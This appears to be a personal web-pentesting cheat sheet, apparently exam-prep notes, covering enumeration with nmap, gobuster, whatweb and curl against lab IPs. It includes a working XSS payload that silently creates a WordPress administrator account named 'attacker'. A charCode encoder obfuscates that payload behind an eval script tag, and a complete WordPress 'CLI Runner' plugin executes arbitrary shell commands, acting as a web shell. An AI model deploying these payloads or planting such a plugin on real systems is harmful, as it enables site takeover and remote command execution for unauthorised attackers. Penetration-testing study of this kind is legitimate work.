# Web Ass Tool
## Nmap
- Use NSE script
``` http-num  ```

## Use Gobuster 

    Gobuster fuzzing

    ``` gobuster dir -u {ip} -w /usr/share/wordlists/dirb/common.txt -t 5 ```

## Burp Suite
- You know what to do =]

## enum version/ using which service
- ``` whatweb ```

# Web Enum
- curl POST ``` curl -X POST -d "code=2*2" http://192.168.171.117:50000/verify```

## Gobuster enum API
- Provide pattern in pattern file
    ``` {GOBUSTER}/v1 ```

- Enum
    ``` gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern -t 20```

- Useful url

    ``` sitemap.xml robots.txt ```

- Useful header info

    ``` X-??? ```

- http file to markdown
  ``` curl -s http://192.168.244.140:8000/ | html2markdown ```
    
# Try Default password !!!

## XSS
Wont be much in exam
- Identify vuln params
- Prepare payload to vuln page/plugin/etc E.G. adding new account to the web

    ```
    var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
    ajaxRequest = new XMLHttpRequest();
    ajaxRequest.open("POST", requestURL, true);
    ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    ajaxRequest.send(params);
    ```
- Minified it with this:
  
    ``` 
    function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
            
    let encoded = encode_to_javascript('insert_minified_javascript')
    console.log(encoded)
    ```

- payload example

    ``` "<script>eval(String.fromCharCode( {output} ..... ))</script> ```

- Simple CLI runner plugin in WP
``` 
<?php
/*
Plugin Name: CLI Runner
Plugin URI: https://example.com/cli-runner
Description: A plugin that allows you to run command line interface (CLI) commands from WordPress.
Version: 1.0.0
Author: Your Name
Author URI: https://example.com
License: GPL2
*/

if (!defined('ABSPATH')) {
    exit; // Exit if accessed directly
}

if (!class_exists('CLI_Runner')) {

    class CLI_Runner {

        public function __construct() {
            // Add a custom action to the WordPress admin menu
            add_action('admin_menu', array($this, 'add_menu'));
        }

        public function add_menu() {
            // Add a submenu under "Tools"
            add_submenu_page(
                'tools.php', // Parent slug
                'CLI Runner', // Page title
                'CLI Runner', // Menu title
                'manage_options', // Capability required
                'cli-runner', // Menu slug
                array($this, 'cli_runner_page') // Callback function
            );
        }

        public function cli_runner_page() {
            // Check if the form has been submitted
            if (isset($_POST['cli_runner_command'])) {
                $command = sanitize_text_field($_POST['cli_runner_command']);
                $output = exec($command);
                echo "<pre>$output</pre>";
            }
            ?>
            <div class="wrap">
                <h1>CLI Runner</h1>
                <form method="post">
                    <textarea name="cli_runner_command" rows="10" cols="80"></textarea><br>
                    <input type="submit" value="Run Command" class="button button-primary">
                </form>
            </div>
            <?php
        }

    }

}

// Initialize the plugin
$cli_runner = new CLI_Runner();
```

